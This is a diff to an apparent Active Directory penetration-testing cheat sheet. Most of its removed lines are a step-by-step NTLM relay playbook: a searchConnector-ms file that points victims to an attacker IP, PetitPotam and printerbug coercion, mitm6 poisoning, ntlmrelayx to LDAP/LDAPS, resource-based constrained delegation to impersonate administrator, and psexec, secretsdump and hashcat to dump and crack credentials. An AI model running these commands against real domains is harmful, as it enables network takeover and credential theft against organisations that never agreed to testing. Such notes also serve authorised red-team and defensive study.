@@ -285,138 +285,18 @@ proxychains python3 secretsdump.py <DOMAIN>/<USER>:IDontCareAboutPassword@<TARGE
 proxychains python3 smbclient.py <DOMAIN>/<USER>:IDontCareAboutPassword@<TARGET>
 ```
 
-### LDAP Relaying
-- Requires LDAP signing to be turned off (default)
+## LDAP Relaying
+- Requires LDAP signing or LDAPS Binding to be turned off (default).
 
-#### Check LDAP Signing
+#### Check LDAP Signing or Binding
 - https://github.com/zyn3rgy/LdapRelayScan
 ```
 python3 LdapRelayScan.py -method BOTH -dc-ip <IP> -u <USER> -p <PASSWORD>
 
-cme ldap <DC IP> -u <USER> -p <PASSWORD> -M ldap-signing
+cme ldap <DC IP> -u <USER> -p <PASSWORD> -M ldap-checker
 ```
 
-### LDAP Relay force HTTP/WEBDAV requests
-- Requires HTTP/WEBDAV requests, because SMB signing is enabled by default.
+### Resource Based Constraind Delegation attacks
+[Resource Based Constrained Delegation attacks](/Domain-Privilege-Escalation.md#Resource-Based-Constrained-Delegation)
 
-#### Scan for target with webclient active
-- https://github.com/Hackndo/WebclientServiceScanner
-```
-webclientservicescanner <DOMAIN>/<USER>:<PASSWORD>@<IP RANGE> -dc-ip <DC IP>
-```
 
-#### If no targets, place file on share to activate webclients
-- https://www.bussink.net/webclient_activation/
-- Filename ```Documents.searchConnector-ms```
-```
-<?xml version="1.0" encoding="UTF-8"?>
-<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
-    <iconReference>imageres.dll,-1002</iconReference>
-    <description>Microsoft Outlook</description>
-    <isSearchOnlyItem>false</isSearchOnlyItem>
-    <includeInStartMenuScope>true</includeInStartMenuScope>
-    <iconReference>//<ATTACKER IP>@80/test.ico</iconReference>
-    <templateInfo>
-        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
-    </templateInfo>
-    <simpleLocation>
-        <url>//<ATTACKER IP>@80/test</url>
-    </simpleLocation>
-</searchConnectorDescription>
-```
-
-#### Enable the LDAP relay
-```
-ntlmrelayx.py -t ldap://<DC IP> 
-```
-
-#### Trigger target to authenticate to attacker machine
-- https://github.com/topotam/PetitPotam
-- https://github.com/dirkjanm/krbrelayx
-```
-python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <HOSTNAME ATTACKER MACHINE>@80/a <TARGET>
-
-python3 printerbug.py <DOMAIN>/<USER>@<TARGET> <HOSTNAME ATTACKER MACHINE>@80/a
-```
-
-- However, since printerbug and PetitPotam both needed authentication to work, we could have just used a tool like ldapdomaindump to directly bind to LDAP ourselves and dump the data directly. To do this unauthenticated use mitm6!
-
-### LDAP Relay with Mitm6
-```
-sudo python3 mitm6.py -d <DOMAIN> --ignore-nofqdn
-ntlmrelayx.py -t ldap://<DC IP> -wh <DOMAIN> -6 
-```
-
-### LDAPS Relaying
-- Relaying LDAPS can add a new computer account by abusing the fact that, by default, user are allowed to join domain up to 10 new computer objects
-- When possible, use the FQDN instead of the IP address. The IP address works most of the time, but FQDN looks cleaner and avoids SNI certificate conflicts.
-- Requires LDAPS binding to be turned off (default)
-
-#### Check LDAPS binding
-- https://github.com/zyn3rgy/LdapRelayScan
-```
-python3 LdapRelayScan.py -method BOTH -dc-ip <IP> -u <USER> -p <PASSWORD>
-```
-
-#### Enable the LDAPS relay
-- Can wait for mitm6 to poison or force it
-```
-sudo python3 mitm6.py -d <DOMAIN> --ignore-nofqdn
-
-ntlmrelayx.py -t ldaps://<DC IP> --add-computer <COMPUTER NAME> 
-```
-
-#### Trigger target to authenticate to attacker machine
-- https://github.com/topotam/PetitPotam
-- https://github.com/dirkjanm/krbrelayx
-```
-python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <HOSTNAME ATTACKER MACHINE>@80/a <TARGET>
-
-python3 printerbug.py <DOMAIN>/<USER>@<TARGET> <HOSTNAME ATTACKER MACHINE>@80/a
-```
-
-- When computer account is created. This account can be used to enumerate the domain!
-
-### Resource Based Constrained Delegation Webclient Attack
-- Requirements:
-  - On a Domain Controller to have the LDAP server signing not enforced (default value) (Requires authentication to check)
-  - On a Domain Controller to have the LDAPS channel binding not required (default value)
-  - Able to add new machines accounts (default value this quota is 10) (Requires authentication to check)
-  - On the network, machines with WebClient running (some OS version had this service running by default or use the webclient starting trick from DTMSecurity) (Requires authentication to check)
-  - A DNS record pointing to the attacker’s machine (By default authenticated users can do this) (Requires authentication to add)
-
-#### Check LDAPS Binding
-- https://github.com/zyn3rgy/LdapRelayScan
-```
-python3 LdapRelayScan.py -method LDAPS -dc-ip <IP>
-```
-
-#### Start mitm6 and NTLMRelay
-```
-sudo python3 mitm6.py -d <DOMAIN> --ignore-nofqdn
-sudo ntlmrelayx.py -t ldaps://<DC IP> --delegate-access 
-```
-
-- When computer account is created. This account can be used to enumerate the domain!
-
-#### Check for a user to impersonate
-- Preferably a user that would be admin on the machine (Check BloodHound).
-- User should not be part of "Protected Users group" or accounts with the "This account is sensitive and cannot be delegated" right
-```
-$creds = Get-Credential
-Get-DomainUser -Credential $creds -Domain <DOMAIN> -Server <DC IP> | ? {!($_.memberof -Match "Protected Users")} | select samaccountname, memberof
-```
-
-#### Impersonate any user and exploit
-- Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right
-```
-getST.py <DOMAIN>/<MACHINE ACCOUNT>@<TARGET FQDN> -spn cifs/<TARGET FQDN> -impersonate administrator -dc-ip <DC IP>
-Export KRB5CCNAME=administrator.ccache
-python3 Psexec.py -k -no-pass <TARGET FQDN>
-python3 Secretsdump.py -k <TARGET FQDN>
-```
-
-## Crack with Hashcat
-```
-hashcat -a 0 -m 5600 .\hash.txt .\wordlists\rockyou.txt -w3 -O
-```
